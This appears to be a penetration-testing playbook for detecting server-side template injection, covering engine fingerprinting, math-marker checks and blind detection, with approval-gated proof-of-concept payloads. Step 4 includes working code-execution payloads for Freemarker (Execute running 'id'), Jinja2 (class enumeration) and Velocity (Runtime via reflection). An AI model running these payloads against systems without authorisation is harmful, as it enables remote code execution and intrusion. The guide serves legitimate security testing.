# SSTI — Server-Side Template Injection

Goal: detect which template engine runs server-side by causing a distinctive evaluation
error or a deterministic math/string result, then (only with approval) prove code execution.

## Step 1 — fingerprint the engine (error messages)

Send a raw `${{<expr>}}` / `${<expr>}` / `<%= <expr> %>` and read the error. Distinctive
errors map to engines:

| Engine | Signature error / syntax |
|---|---|
| Jinja2 (Python) | `jinja2.exceptions.UndefinedError`, `TemplateSyntaxError` |
| Twig (PHP) | `Twig\Error\SyntaxError` |
| Freemarker (Java) | `freemarker.core.InvalidReferenceException` |
| Velocity (Java) | `org.apache.velocity.exception` |
| Go `html/template` | `template: ... at <...>` |
| ERB (Ruby) | `(erb):1: syntax error` |
| Handlebars | `Parse error` |
| Pug/Jade (Node) | `TypeError` / `Cannot read property` |

## Step 2 — confirm evaluation (math marker)

Once you have an engine hint, inject a deterministic expression and check the *rendered*
output (not just reflection):

- **Jinja2 / Twig / ERB / Nunjucks:** `{{ 7*7 }}` → expect `49`
- **Freemarker:** `${7*7}` → `49`
- **Velocity:** `#set($x=7*7)$x` → `49`
- **Go text/template:** `{{printf "%d" 9999}}` (Go has no `*` in templates)
- **Pug:** `#{7*7}` → `49`

## Step 3 — read-back markers (blind detection)

If the result isn't reflected, use an OOB/read-back side effect:

- Jinja2: `{{ 'MARKER' }}` then grep the page for `MARKER`.
- Blind/time: `${'MARKER'.toString().repeat(1)}` variants, or a sleep with a *short* cap.

## Step 4 — PoC (requires approval, read-only where possible)

- **Jinja2:** `{{ config }}` (app config), `{{ self.__init__.__globals__ }}`, or
  `{{ ''.__class__.__mro__[1].__subclasses__() }}` to enumerate classes.
- **Freemarker:** `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`
- **Velocity:** `#set($s="")$s.getClass().forName("java.lang.Runtime")`
- **Twig:** `{{ _self }}`, `{{ dump(app) }}` (Symfony).

Do NOT run `id`/`whoami` until the user confirms; a class enumeration is usually enough proof.
